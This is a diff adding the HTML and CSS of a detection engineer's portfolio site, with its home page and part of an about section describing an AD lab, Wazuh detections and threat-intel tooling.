@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'unsafe-inline'; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none';">
+<meta name="referrer" content="no-referrer">
+<title>Aryan // honeybadger — Detection Engineering</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070708;
+  --text:#f1f1f4;
+  --dim:#9a9aa2;
+  --faint:#5c5c64;
+  --line:rgba(255,255,255,.1);
+  --card:rgba(11,11,15,.64);
+  --card-hi:rgba(22,22,28,.78);
+  --glass:rgba(255,255,255,.05);
+  --glass-hi:rgba(255,255,255,.1);
+  --accent:#f1f1f4;
+  --accent-ink:#0b0b0d;
+  --sans:'Sora',system-ui,sans-serif;
+  --body:'Inter',system-ui,sans-serif;
+  --mono:'JetBrains Mono',monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:16px;line-height:1.65;overflow-x:hidden;}
+a{color:inherit;}
+
+/* ── FULL-PAGE DITHER ── */
+#dither{position:fixed;inset:0;z-index:-2;width:100%;height:100%;display:block;background:#070708;}
+#dither-fallback{position:fixed;inset:0;z-index:-2;display:none;background:radial-gradient(circle at 30% 30%,#1a1a1f,#070708 70%);}
+#dither.failed{display:none;}
+#dither.failed ~ #dither-fallback{display:block;}
+
+/* ── GLASS NAV ── */
+nav{position:fixed;top:16px;left:50%;transform:translateX(-50%);z-index:100;width:calc(100% - 32px);max-width:1080px;height:58px;padding:0 12px 0 22px;display:flex;justify-content:space-between;align-items:center;border-radius:16px;background:rgba(10,10,13,.55);border:1px solid var(--line);backdrop-filter:blur(20px) saturate(140%);-webkit-backdrop-filter:blur(20px) saturate(140%);overflow:hidden;}
+nav::before{content:'';position:absolute;inset:0;background:linear-gradient(100deg,transparent 22%,rgba(255,255,255,.12) 50%,transparent 78%);pointer-events:none;}
+.nav-logo{position:relative;font-family:var(--sans);font-weight:700;font-size:17px;letter-spacing:-.01em;text-decoration:none;display:flex;align-items:center;gap:8px;}
+.nav-logo .mark{width:18px;height:18px;border-radius:5px;background:var(--text);display:inline-block;position:relative;}
+.nav-logo .mark::after{content:'';position:absolute;inset:4px;border-radius:2px;background:#0b0b0d;}
+.nav-logo .alias{font-family:var(--mono);font-weight:400;font-size:11px;color:var(--dim);}
+.nav-right{position:relative;display:flex;align-items:center;gap:6px;}
+.nav-links{display:flex;gap:2px;list-style:none;}
+.nav-links a{font-family:var(--body);font-weight:500;font-size:13px;color:var(--dim);text-decoration:none;padding:8px 13px;border-radius:9px;transition:color .15s,background .15s;}
+.nav-links a:hover,.nav-links a.active{color:var(--text);background:var(--glass-hi);}
+.nav-cta{font-family:var(--body);font-weight:600;font-size:13px;background:var(--accent);color:var(--accent-ink);border:none;padding:9px 17px;border-radius:999px;cursor:pointer;transition:transform .15s,opacity .15s;}
+.nav-cta:hover{transform:translateY(-1px);opacity:.9;}
+.nav-toggle{display:none;font-family:var(--body);font-weight:600;font-size:12px;background:var(--glass-hi);color:var(--text);border:1px solid var(--line);padding:8px 12px;border-radius:9px;cursor:pointer;}
+
+#page-overlay{position:fixed;inset:0;z-index:1000;pointer-events:none;background:var(--bg);opacity:0;transition:opacity .26s ease;}
+#page-overlay.show{opacity:.82;}
+
+.page{display:none;padding-top:96px;min-height:100vh;}
+.page.active{display:block;animation:pageIn .55s cubic-bezier(.2,.7,.2,1);}
+@keyframes pageIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.wrap{max-width:1080px;margin:0 auto;padding:0 24px 90px;}
+
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--dim);display:inline-flex;align-items:center;gap:9px;padding:8px 15px;border-radius:999px;background:rgba(10,10,13,.5);border:1px solid var(--line);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);}
+.eyebrow .dot{width:6px;height:6px;border-radius:50%;background:#7CFC8A;box-shadow:0 0 8px #7CFC8A;}
+
+.sec-head{margin-bottom:42px;}
+.sec-kicker{font-family:var(--mono);font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--dim);margin-bottom:14px;}
+.sec-kicker b{color:var(--text);}
+.sec-title{font-family:var(--sans);font-weight:700;font-size:clamp(34px,5vw,56px);letter-spacing:-.02em;line-height:1.02;text-shadow:0 2px 30px rgba(0,0,0,.6);}
+.sec-lead{margin-top:18px;max-width:62ch;font-size:16px;line-height:1.7;color:var(--dim);}
+.pwhy{font-size:14px;line-height:1.7;color:var(--text);margin:18px 0 0;padding:14px 16px;border-left:2px solid var(--text);background:rgba(255,255,255,.03);border-radius:0 8px 8px 0;}
+.pwhy b{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);display:block;margin-bottom:5px;font-weight:400;}
+
+.reveal{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease;}
+.reveal.vis{opacity:1;transform:none;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+.fu{opacity:0;animation:fadeUp .8s cubic-bezier(.2,.7,.2,1) forwards;}
+.fu:nth-child(1){animation-delay:.05s}.fu:nth-child(2){animation-delay:.16s}.fu:nth-child(3){animation-delay:.28s}
+.fu:nth-child(4){animation-delay:.4s}.fu:nth-child(5){animation-delay:.52s}.fu:nth-child(6){animation-delay:.64s}
+
+.btn{display:inline-flex;align-items:center;gap:9px;font-family:var(--body);font-weight:600;font-size:14px;background:var(--accent);color:var(--accent-ink);border:1px solid var(--accent);padding:13px 24px;border-radius:999px;cursor:pointer;transition:transform .16s,opacity .16s;}
+.btn:hover{transform:translateY(-2px);opacity:.92;}
+.btn::after{content:'→';}
+.btn.ghost{background:rgba(10,10,13,.5);color:var(--text);border:1px solid var(--line);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);}
+.btn.ghost:hover{background:rgba(22,22,28,.7);}
+
+.page-nav{display:flex;justify-content:space-between;gap:14px;padding:34px 0 0;}
+.pgbtn{flex:1;display:flex;flex-direction:column;gap:5px;text-align:left;border-radius:14px;padding:18px 22px;cursor:pointer;background:var(--card);border:1px solid var(--line);transition:transform .16s,background .16s;}
+.pgbtn:hover{transform:translateY(-2px);background:var(--card-hi);}
+.pgbtn.next{text-align:right;align-items:flex-end;}
+.pgbtn span{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);}
+.pgbtn b{font-family:var(--sans);font-weight:600;font-size:19px;letter-spacing:-.01em;}
+.pgbtn.hidden{visibility:hidden;}
+
+/* ════ HOME / HERO over dither ════ */
+#hero{position:relative;min-height:calc(100vh - 96px);display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:30px 0 60px;}
+#hero::before{content:'';position:absolute;left:50%;top:46%;transform:translate(-50%,-50%);width:min(780px,92%);height:min(520px,80%);background:radial-gradient(ellipse at center,rgba(7,7,8,.82) 0%,rgba(7,7,8,.5) 45%,transparent 72%);pointer-events:none;z-index:0;}
+.hero-inner{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;}
+.hero-h1{font-family:var(--sans);font-weight:800;font-size:clamp(44px,7.5vw,92px);letter-spacing:-.03em;line-height:.97;max-width:15ch;margin:24px 0 20px;text-shadow:0 4px 40px rgba(0,0,0,.7);}
+.hero-h1 .soft{color:#bcbcc4;}
+.hero-sub{font-size:18px;color:#d2d2d8;max-width:540px;line-height:1.7;margin-bottom:32px;text-shadow:0 2px 18px rgba(0,0,0,.8);}
+.hero-sub b{color:#fff;font-weight:600;}
+.hero-cta{display:flex;gap:13px;flex-wrap:wrap;justify-content:center;}
+.scroll-cue{margin-top:54px;font-family:var(--mono);font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:rgba(255,255,255,.5);display:flex;align-items:center;gap:8px;text-shadow:0 1px 8px rgba(0,0,0,.8);}
+.scroll-cue .ar{animation:bob 1.6s ease-in-out infinite;}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(4px)}}
+
+/* ── CUSTOMIZE PLAYGROUND ── */
+.home-tease{margin:54px auto 0;max-width:660px;text-align:center;font-family:var(--body);font-size:15px;color:var(--dim);line-height:1.7;}
+.home-tease b{color:var(--text);font-weight:600;}
+.home-tease a{color:var(--text);text-decoration:none;border-bottom:1px solid var(--line);}
+.home-tease a:hover{border-color:var(--text);}
+.cz{margin-top:70px;padding-top:36px;border-top:1px solid var(--line);}
+.cz-sub{font-family:var(--body);font-size:13px;color:var(--dim);margin-top:6px;max-width:46ch;}
+.cz-head{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:18px;}
+.cz-title{font-family:var(--sans);font-weight:700;font-size:24px;letter-spacing:-.02em;display:flex;align-items:center;gap:11px;text-shadow:0 2px 20px rgba(0,0,0,.7);}
+.cz-title::before{content:'';width:9px;height:9px;border-radius:2px;background:var(--text);}
+.cz-reset{font-family:var(--body);font-weight:500;font-size:12px;color:var(--dim);background:var(--card);border:1px solid var(--line);border-radius:999px;padding:8px 15px;cursor:pointer;transition:color .15s,background .15s;}
+.cz-reset:hover{color:var(--text);background:var(--card-hi);}
+.cz-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;}
+.cz-ctrl{border-radius:13px;padding:16px 18px;background:var(--card);border:1px solid var(--line);}
+.cz-ctrl .row{display:flex;align-items:center;justify-content:space-between;gap:14px;}
+.cz-lab{font-family:var(--body);font-weight:500;font-size:13px;color:var(--text);}
+.cz-val{font-family:var(--mono);font-size:12px;color:var(--dim);min-width:40px;text-align:right;}
+.cz-ctrl input[type=range]{margin-top:14px;}
+.tg{position:relative;width:42px;height:23px;border-radius:999px;background:var(--line);border:1px solid var(--line);cursor:pointer;flex-shrink:0;transition:background .2s;}
+.tg.on{background:var(--text);}
+.tg::after{content:'';position:absolute;top:2px;left:2px;width:17px;height:17px;border-radius:50%;background:#0b0b0d;transition:left .2s;}
+.tg.on::after{left:21px;}
+.cz-swatches{display:flex;gap:9px;margin-top:14px;}
+.sw{width:30px;height:30px;border-radius:8px;cursor:pointer;border:2px solid transparent;transition:transform .14s,border-color .14s;}
+.sw:hover{transform:scale(1.08);}
+.sw.active{border-color:var(--text);}
+.sw[data-c="grayscale"]{background:linear-gradient(135deg,#e8e8ee,#7d7d86);}
+.sw[data-c="red"]{background:linear-gradient(135deg,#ff5a45,#b01608);}
+.sw[data-c="purple"]{background:linear-gradient(135deg,#b98cff,#6a2ce0);}
+.sw[data-c="blue"]{background:linear-gradient(135deg,#6fb0ff,#1f5fe0);}
+
+input[type=range]{-webkit-appearance:none;appearance:none;width:100%;height:4px;border-radius:4px;background:var(--line);outline:none;cursor:pointer;}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;height:16px;border-radius:50%;background:var(--text);cursor:pointer;}
+input[type=range]::-moz-range-thumb{width:16px;height:16px;border-radius:50%;background:var(--text);cursor:pointer;border:none;}
+
+/* ── cards / sections ── */
+.terminal{margin:46px auto 0;max-width:660px;border-radius:14px;overflow:hidden;background:var(--card);border:1px solid var(--line);text-align:left;}
+.term-bar{display:flex;align-items:center;gap:7px;padding:11px 16px;border-bottom:1px solid var(--line);}
+.term-dot{width:9px;height:9px;border-radius:50%;background:var(--faint);}
+.term-title{font-family:var(--mono);font-size:11px;color:var(--dim);margin-left:7px;}
+.term-body{padding:15px 18px;font-family:var(--mono);font-size:13px;line-height:1.7;min-height:130px;max-height:220px;overflow-y:auto;}
+.term-line{white-space:pre-wrap;word-break:break-word;color:var(--dim);}
+.term-line.cmd{color:var(--text);}
+.term-line.cmd::before{content:'$ ';color:var(--text);opacity:.5;}
+.term-line.accent{color:var(--text);}
+.term-input-row{display:flex;align-items:center;gap:8px;padding:0 18px 16px;}
+.term-prompt{font-family:var(--mono);font-size:13px;color:var(--dim);}
+#term-input{flex:1;background:transparent;border:none;outline:none;font-family:var(--mono);font-size:13px;color:var(--text);caret-color:var(--text);}
+#term-input::placeholder{color:var(--faint);}
+
+.stat-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;margin:46px 0 0;width:100%;}
+.stat{border-radius:14px;padding:22px 18px;background:var(--card);border:1px solid var(--line);text-align:left;transition:transform .16s,background .16s;}
+.stat:hover{transform:translateY(-3px);background:var(--card-hi);}
+.stat-n{font-family:var(--sans);font-weight:700;font-size:34px;letter-spacing:-.02em;margin-bottom:9px;}
+.stat-l{font-family:var(--mono);font-size:10px;letter-spacing:.04em;color:var(--dim);line-height:1.5;}
+
+.about-grid{display:grid;grid-template-columns:1.45fr 1fr;gap:44px;}
+.about-main{border-radius:16px;padding:32px 34px;background:var(--card);border:1px solid var(--line);}
+.about-main p{font-size:19px;line-height:1.85;margin-bottom:22px;color:var(--text);}
+.about-main p:last-child{margin-bottom:0;}
+.about-main em{font-style:normal;font-weight:600;}
+.principles{display:flex;flex-wrap:wrap;gap:8px;margin-top:28px;}
+.pr{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--dim);padding:7px 12px;border:1px solid var(--line);border-radius:999px;}
+.about-side{border-radius:16px;align-self:start;background:var(--card);border:1px solid var(--line);overflow:hidden;}
+.arow{display:flex;justify-content:space-between;gap:16px;padding:14px 18px;border-bottom:1px solid var(--line);}
+.arow:last-child{border-bottom:none;}
+.akey{font-family:var(--mono);font-size:11px;letter-spacing:.04em;text-transform:uppercase;color:var(--faint);}
+.aval{font-family:var(--mono);font-size:12px;color:var(--text);text-align:right;}
+.aval a{text-decoration:none;border-bottom:1px solid var(--line);}
+.aval a:hover{border-color:var(--text);}
+
+.sk-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+.skblock{border-radius:16px;padding:30px 28px;background:var(--card);border:1px solid var(--line);transition:transform .16s,background .16s;}
+.skblock:hover{transform:translateY(-3px);background:var(--card-hi);}
+.sk-n{font-family:var(--mono);font-size:12px;color:var(--faint);margin-bottom:14px;}
+.sk-t{font-family:var(--sans);font-weight:700;font-size:23px;letter-spacing:-.01em;margin-bottom:16px;}
+.tags{display:flex;flex-wrap:wrap;gap:7px;margin-bottom:15px;}
+.tag{font-family:var(--mono);font-size:10px;letter-spacing:.02em;padding:5px 10px;border-radius:999px;border:1px solid var(--line);text-transform:uppercase;color:var(--dim);}
+.tag.hl{border-color:var(--text);color:var(--text);}
+.sk-note{font-family:var(--body);font-size:13px;color:var(--dim);}
+
+.pcard{border-radius:18px;padding:32px 34px;margin-bottom:18px;background:var(--card);border:1px solid var(--line);transition:transform .18s,background .18s;}
+.pcard:hover{transform:translateY(-3px);background:var(--card-hi);}
+.pcard-top{display:flex;justify-content:space-between;align-items:flex-start;gap:18px;margin-bottom:13px;flex-wrap:wrap;}
+.ptype{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--dim);}
+.pstatus{font-family:var(--mono);font-size:10px;letter-spacing:.04em;text-transform:uppercase;color:var(--dim);background:var(--glass-hi);border:1px solid var(--line);padding:5px 11px;border-radius:999px;white-space:nowrap;}
+.ptitle{font-family:var(--sans);font-weight:700;font-size:clamp(26px,3.4vw,40px);letter-spacing:-.02em;line-height:1.02;margin-bottom:13px;}
+.pdesc{font-size:16px;color:var(--dim);line-height:1.75;margin-bottom:20px;max-width:760px;}
+.pbullets{list-style:none;display:grid;grid-template-columns:1fr 1fr;gap:8px 30px;}
+.pbullets li{font-family:var(--mono);font-size:12px;color:var(--dim);line-height:1.55;padding-left:18px;position:relative;}
+.pbullets li::before{content:'—';position:absolute;left:0;color:var(--faint);}
+
+.risk{margin-top:24px;border-radius:14px;padding:20px 22px;background:rgba(255,255,255,.03);border:1px solid var(--line);}
+.risk-h{font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--dim);margin-bottom:15px;}
+.risk-h b{color:var(--text);}
+.risk-row{display:flex;align-items:center;gap:18px;flex-wrap:wrap;}
+.risk-control{flex:1;min-width:220px;}
+.risk-control label{font-family:var(--mono);font-size:11px;color:var(--dim);display:flex;justify-content:space-between;margin-bottom:9px;}
+.risk-control label b{color:var(--text);}
+.risk-score{text-align:center;min-width:110px;}
+.risk-score .num{font-family:var(--sans);font-weight:700;font-size:46px;letter-spacing:-.02em;}
+.risk-score .lab{font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);}
+.risk-bar{height:5px;border-radius:4px;background:var(--line);margin-top:13px;overflow:hidden;}
+.risk-bar i{display:block;height:100%;background:var(--text);transition:width .25s ease;}
+
+#wu-list{border-radius:16px;overflow:hidden;background:var(--card);border:1px solid var(--line);}
+#wu-list .wu-row{display:grid;grid-template-columns:116px 1fr 150px;gap:26px;align-items:center;width:100%;text-align:left;padding:22px 22px;border:none;border-bottom:1px solid var(--line);background:transparent;cursor:pointer;transition:background .15s,padding-left .15s;font-family:var(--body);color:inherit;}
+#wu-list .wu-row:last-child{border-bottom:none;}
+#wu-list .wu-row:hover{background:var(--card-hi);padding-left:28px;}
+.wu-date{font-family:var(--mono);font-size:11px;color:var(--faint);}
+.wu-ttl{font-family:var(--sans);font-weight:600;font-size:19px;letter-spacing:-.01em;}
+.wu-tag{font-family:var(--mono);font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--dim);text-align:right;}
+#wu-detail{display:none;}
+#wu-detail.active{display:block;}
+.wu-back{font-family:var(--body);font-weight:600;font-size:13px;color:var(--text);background:var(--card);border:1px solid var(--line);border-radius:999px;padding:10px 18px;cursor:pointer;display:inline-flex;gap:8px;margin-bottom:32px;}
+.wu-back::before{content:'←';}
+.wu-article{display:none;}
+.wu-article.show{display:block;}
+.wu-article-wrap{border-radius:16px;padding:34px 38px;background:var(--card);border:1px solid var(--line);}
+.wu-article-meta{display:flex;gap:18px;font-family:var(--mono);font-size:11px;letter-spacing:.06em;text-transform:uppercase;color:var(--faint);margin-bottom:16px;}
+.wu-article-title{font-family:var(--sans);font-weight:700;font-size:clamp(30px,4vw,46px);letter-spacing:-.02em;line-height:1.04;margin-bottom:30px;max-width:20ch;}
+.wu-body{max-width:740px;}
+.wu-body h2{font-family:var(--sans);font-weight:700;font-size:24px;letter-spacing:-.01em;margin:32px 0 12px;}
+.wu-body h3{font-family:var(--mono);font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin:26px 0 11px;}
+.wu-body p{font-size:17px;line-height:1.8;margin-bottom:16px;color:var(--text);}
+.wu-body strong{font-weight:600;}
+.wu-body ul{margin:0 0 16px 0;list-style:none;}
+.wu-body li{font-size:16px;line-height:1.7;padding-left:20px;position:relative;margin-bottom:8px;color:var(--dim);}
+.wu-body li::before{content:'—';position:absolute;left:0;color:var(--faint);}
+.wu-body pre{font-family:var(--mono);font-size:13px;line-height:1.7;background:rgba(0,0,0,.4);border-radius:10px;border:1px solid var(--line);padding:16px 18px;margin-bottom:16px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;color:var(--text);}
+.wu-body code{font-family:var(--mono);font-size:.92em;background:rgba(255,255,255,.07);padding:1px 6px;border-radius:4px;}
+
+.sq-intro{font-family:var(--sans);font-weight:600;font-size:clamp(24px,3.2vw,38px);letter-spacing:-.02em;line-height:1.1;max-width:20ch;margin-bottom:38px;text-shadow:0 2px 24px rgba(0,0,0,.7);}
+.sq-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;}
+.sq-item{border-radius:16px;padding:28px 28px;background:var(--card);border:1px solid var(--line);transition:transform .16s,background .16s;}
+.sq-item:hover{transform:translateY(-3px);background:var(--card-hi);}
+.sq-icon{font-size:22px;display:block;margin-bottom:13px;opacity:.85;}
+.sq-name{font-family:var(--sans);font-weight:600;font-size:20px;letter-spacing:-.01em;margin-bottom:9px;}
+.sq-desc{font-size:14px;color:var(--dim);line-height:1.7;}
+
+.ct-grid{display:grid;grid-template-columns:1fr 1fr;gap:44px;}
+.ct-l{border-radius:16px;padding:34px 36px;background:var(--card);border:1px solid var(--line);}
+.ct-title{font-family:var(--sans);font-weight:700;font-size:clamp(34px,4.6vw,60px);letter-spacing:-.03em;line-height:1;margin-bottom:22px;}
+.ct-note{font-size:16px;color:var(--dim);line-height:1.8;margin-bottom:30px;max-width:380px;}
+.ct-link{display:flex;justify-content:space-between;align-items:center;gap:16px;padding:17px 0;border-bottom:1px solid var(--line);text-decoration:none;font-family:var(--mono);font-size:14px;transition:padding-left .15s;color:var(--text);}
+.ct-link:first-of-type{border-top:1px solid var(--line);}
+.ct-link:hover{padding-left:8px;}
+.ct-r{display:flex;flex-direction:column;justify-content:center;}
+.ct-r p{font-size:15px;color:var(--dim);line-height:1.8;margin-bottom:24px;}
+.pgp{border-radius:14px;padding:22px;background:var(--card);border:1px solid var(--line);}
+.pgp-l{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim);margin-bottom:10px;}
+.pgp-k{font-family:var(--mono);font-size:12px;color:var(--dim);line-height:1.7;word-break:break-all;}
+
+footer{border-top:1px solid var(--line);padding:24px;display:flex;justify-content:space-between;align-items:center;gap:14px;flex-wrap:wrap;max-width:1080px;margin:0 auto;}
+.ft{font-family:var(--mono);font-size:11px;letter-spacing:.04em;color:var(--faint);}
+
+::-webkit-scrollbar{width:9px;}::-webkit-scrollbar-track{background:transparent;}::-webkit-scrollbar-thumb{background:var(--faint);border-radius:6px;}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2px solid var(--text);outline-offset:2px;}
+
+@media(prefers-reduced-motion:reduce){*{animation-duration:.001s!important;animation-iteration-count:1!important;transition-duration:.001s!important;}.reveal{opacity:1;transform:none;}html{scroll-behavior:auto;}}
+@media(max-width:920px){
+  nav{padding:0 10px 0 16px;}
+  .nav-links{position:fixed;top:84px;left:16px;right:16px;flex-direction:column;gap:2px;border-radius:14px;padding:8px;display:none;background:rgba(10,10,13,.96);border:1px solid var(--line);}
+  .nav-links.open{display:flex;}
+  .nav-links a{padding:13px;border-radius:9px;}
+  .nav-toggle{display:inline-block;}
+  .nav-cta{display:none;}
+  .wrap{padding:0 16px 70px;}
+  .cz-grid{grid-template-columns:1fr;}
+  .stat-grid{grid-template-columns:1fr 1fr;}
+  .stat:nth-child(5){grid-column:1/-1;}
+  .about-grid,.ct-grid,.sk-grid,.sq-grid{grid-template-columns:1fr;}
+  .pbullets{grid-template-columns:1fr;}
+  #wu-list .wu-row{grid-template-columns:1fr;gap:5px;}
+  .wu-tag{text-align:left;}
+  .risk-row{flex-direction:column;align-items:stretch;}
+}
+</style>
+</head>
+<body>
+
+<canvas id="dither"></canvas>
+<div id="dither-fallback"></div>
+<div id="page-overlay"></div>
+
+<nav>
+  <a class="nav-logo" data-page="home" href="#home"><span class="mark"></span>Aryan <span class="alias">/honeybadger</span></a>
+  <div class="nav-right">
+    <ul class="nav-links" id="nav-links">
+      <li><a data-page="about" href="#about">About</a></li>
+      <li><a data-page="skills" href="#skills">Arsenal</a></li>
+      <li><a data-page="projects" href="#projects">Work</a></li>
+      <li><a data-page="writeups" href="#writeups">Writeups</a></li>
+      <li><a data-page="sidequests" href="#sidequests">Side Quests</a></li>
+    </ul>
+    <button class="nav-cta" data-page="contact">Get in touch</button>
+    <button class="nav-toggle" id="nav-toggle" aria-label="Menu">Menu</button>
+  </div>
+</nav>
+
+<!-- ════ HOME ════ -->
+<div class="page active" id="page-home">
+  <div class="wrap">
+    <div id="hero">
+      <div class="hero-inner">
+        <span class="eyebrow fu"><span class="dot"></span> Detection Engineer · Open to work · 2026</span>
+        <h1 class="hero-h1 fu">I build the systems most people only <span class="soft">study.</span></h1>
+        <p class="hero-sub fu"><b>Aryan</b> — a.k.a. <b>honeybadger</b>. Attack the lab, write the detection, automate the build.</p>
+        <div class="hero-cta fu">
+          <button class="btn" data-page="projects">View the work</button>
+          <button class="btn ghost" data-page="contact">Get in touch</button>
+        </div>
+        <div class="scroll-cue fu">move your mouse · tweak it below <span class="ar">↓</span></div>
+      </div>
+    </div>
+
+    <div class="terminal fu">
+      <div class="term-bar"><span class="term-dot"></span><span class="term-dot"></span><span class="term-dot"></span><span class="term-title">honeybadger@portfolio: ~</span></div>
+      <div class="term-body" id="term-body" aria-live="polite"></div>
+      <div class="term-input-row"><span class="term-prompt">$</span><input id="term-input" type="text" autocomplete="off" spellcheck="false" placeholder="type 'help' and hit enter…" aria-label="terminal input"></div>
+    </div>
+
+    <div class="stat-grid fu">
+      <div class="stat"><div class="stat-n">1,400</div><div class="stat-l">Lines · ClassroomEnv</div></div>
+      <div class="stat"><div class="stat-n">4</div><div class="stat-l">Machine AD lab · attacked + detected</div></div>
+      <div class="stat"><div class="stat-n">30d</div><div class="stat-l">Risk half-life · ThreatLens</div></div>
+      <div class="stat"><div class="stat-n">3→1</div><div class="stat-l">Feeds into one risk signal</div></div>
+      <div class="stat"><div class="stat-n">PNPT</div><div class="stat-l">In progress · TCM</div></div>
+    </div>
+
+    <p class="home-tease">Three projects, one loop: <b>attack the lab → write the detection → automate the build.</b> The full breakdown lives under <a href="#projects" data-page="projects">Work</a>.</p>
+
+    <div class="cz">
+      <div class="cz-head">
+        <div>
+          <div class="cz-title">Customize the signal</div>
+          <p class="cz-sub">That background is live and you control it — a small nod to the dithered-signal work. Drag, swipe, recolour.</p>
+        </div>
+        <button class="cz-reset" id="cz-reset">Reset defaults</button>
+      </div>
+      <div class="cz-grid">
+        <div class="cz-ctrl">
+          <div class="row"><span class="cz-lab">Wave Color</span></div>
+          <div class="cz-swatches" id="cz-color">
+            <button class="sw active" data-c="grayscale" aria-label="Grayscale"></button>
+            <button class="sw" data-c="red" aria-label="Red"></button>
+            <button class="sw" data-c="purple" aria-label="Purple"></button>
+            <button class="sw" data-c="blue" aria-label="Blue"></button>
+          </div>
+        </div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Color Intensity</span><span class="cz-val" id="v-levels">4</span></div><input type="range" id="c-levels" min="2" max="8" step="1" value="4"></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Wave Amplitude</span><span class="cz-val" id="v-amp">0.30</span></div><input type="range" id="c-amp" min="0" max="1" step="0.05" value="0.3"></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Wave Frequency</span><span class="cz-val" id="v-freq">3.0</span></div><input type="range" id="c-freq" min="1" max="6" step="0.5" value="3"></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Wave Speed</span><span class="cz-val" id="v-speed">0.05</span></div><input type="range" id="c-speed" min="0" max="0.2" step="0.01" value="0.05"></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Pixel Size</span><span class="cz-val" id="v-px">2</span></div><input type="range" id="c-px" min="1" max="8" step="1" value="2"></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Disable Animation</span><span class="tg" id="t-anim" role="switch" aria-checked="false" tabindex="0"></span></div></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Mouse Interaction</span><span class="tg on" id="t-mouse" role="switch" aria-checked="true" tabindex="0"></span></div></div>
+        <div class="cz-ctrl"><div class="row"><span class="cz-lab">Mouse Radius</span><span class="cz-val" id="v-mr">0.50</span></div><input type="range" id="c-mr" min="0.1" max="1.2" step="0.05" value="0.5"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ════ ABOUT ════ -->
+<div class="page" id="page-about">
+  <div class="wrap">
+    <div class="sec-head"><div class="sec-kicker">01 — <b>About</b></div><h2 class="sec-title">The operator behind the handle.</h2></div>
+    <div class="about-grid">
+      <div class="about-main reveal">
+        <p>I stand up environments from bare metal, attack them from the inside, then engineer the detection and tooling that make the next attack visible — a four-machine AD lab feeding custom Wazuh detections, a threat-intel platform that turns three noisy feeds into one prioritized signal, a deployment framework rigorous enough to trust an entire classroom to.</p>
+        <p>I learn by building. When I misconfigure something in my AD lab and then find it through BloodHound, I understand the misconfiguration in a way reading about it never produces. I ran EternalBlue by hand instead of through a one-line Metasploit module — Wireshark open the whole time — because I wanted to see what the exploit actually does at the packet level. The lab is permanent: not a box I solve and move on from, but a living environment I keep breaking and defending.</p>
+        <p>I'm drawn to the gap between what a system was <em>designed</em> to do and what it actually does under pressure — and to the work of closing that gap and proving it stayed closed.</p>
+        <p>Offense taught me how things fail. Detection is where I make failure visible. Engineering is how I make either one repeatable. I don't decorate ideas with noise — I find the signal.</p>
+        <div class="principles">
+          <span class="pr">Ownership over convenience</span>
+          <span class="pr">Trust nothing until verified</span>
+          <span class="pr">Determinism as a value</span>
+          <span class="pr">Signal over completeness</span>
+        </div>
+      </div>
+      <div class="about-side reveal">
+        <div class="arow"><span class="akey">Name</span><span class="aval">Aryan</span></div>
+        <div class="arow"><span class="akey">Alias</span><span class="aval">honeybadger</span></div>
+        <div class="arow"><span class="akey">Focus</span><span class="aval">Detection · Tooling</span></div>
+        <div class="arow"><span class="akey">Stack</span><span class="aval">Python · FastAPI · Wazuh</span></div>
+        <div class="arow"><span class="akey">OS</span><span class="aval">Linux · Kali</span></div>
+        <div class="arow"><span class="akey">Education</span><span class="aval">B.Tech CS · '27</span></div>
